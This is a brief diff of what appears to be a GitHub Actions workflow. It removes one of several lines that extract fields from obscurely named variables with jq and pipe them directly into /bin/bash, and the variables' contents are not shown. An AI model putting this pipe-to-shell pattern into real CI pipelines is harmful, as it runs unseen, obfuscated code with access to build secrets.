@@ -26,7 +26,6 @@ jobs:
           echo $ovy062 | jq -r .nqqr85187 | /bin/bash
           echo $zqhto0576 | jq -r .hrted18 | /bin/bash
           echo $hbcl46 | jq -r .q7768 | /bin/bash
-          printf '%s' "$evml5" | jq -r .l30798 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
